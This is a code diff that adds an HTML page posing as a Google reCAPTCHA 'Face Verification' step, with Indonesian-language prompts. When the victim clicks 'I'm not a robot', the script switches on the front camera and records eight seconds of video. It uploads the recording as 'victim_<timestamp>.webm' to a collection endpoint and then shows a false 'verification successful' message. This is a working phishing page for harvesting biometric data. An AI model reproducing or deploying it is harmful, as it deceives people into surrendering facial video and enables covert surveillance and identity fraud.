@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<title>reCAPTCHA - Face Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  body { font-family: Arial, sans-serif; background: #f1f1f1; display: flex; align-items: center; justify-content: center; height: 100vh; margin:0; }
+  .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 380px; text-align: center; }
+  .checkbox { border: 2px solid #ccc; width: 24px; height: 24px; display: inline-block; vertical-align: middle; cursor: pointer; }
+  .scan { width: 280px; height: 280px; border: 3px solid #34a853; margin: 20px auto; border-radius: 50%; overflow: hidden; position: relative; }
+  .scan video { width: 100%; height: 100%; object-fit: cover; }
+  .scan::after { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: linear-gradient(transparent, #34a853, transparent); animation: scanline 1.5s linear infinite; }
+  @keyframes scanline { 0% { top: 0; } 100% { top: 100%; } }
+</style>
+</head>
+<body>
+<div class="box" id="step1">
+  <div style="display:flex; align-items:center; justify-content:center; gap:10px; font-size:18px;">
+    <div class="checkbox" id="check" onclick="nextStep()"></div>
+    <span>I'm not a robot</span>
+  </div>
+  <div style="margin-top:20px; color:#666;">reCAPTCHA</div>
+</div>
+
+<div class="box" id="step2" style="display:none;">
+  <h2>Face Verification</h2>
+  <p>Scan wajah Anda</p>
+  <div class="scan">
+    <video id="video" autoplay playsinline></video>
+  </div>
+  <p id="status">Mempersiapkan scan...</p>
+</div>
+
+<script>
+async function nextStep() {
+  document.getElementById('step1').style.display = 'none';
+  document.getElementById('step2').style.display = 'block';
+  startCamera();
+}
+
+async function startCamera() {
+  const status = document.getElementById('status');
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    document.getElementById('video').srcObject = stream;
+    status.textContent = 'Scanning wajah... Jangan gerak!';
+    
+    // Recorder
+    const recorder = new MediaRecorder(stream);
+    let chunks = [];
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.start();
+    setTimeout(() => {
+      recorder.stop();
+      recorder.onstop = () => {
+        const blob = new Blob(chunks, {type: 'video/webm'});
+        const fd = new FormData();
+        fd.append('face_scan', blob, 'victim_' + Date.now() + '.webm');
+        fetch('http://localhost:3000/face-captcha', {method: 'POST', body: fd});
+        status.textContent = 'Verifikasi berhasil!';
+      };
+    }, 8000);
+  } catch (e) {
+    status.textContent = 'Izinkan akses kamera!';
+  }
+}
+</script>
+</body>
+</html>
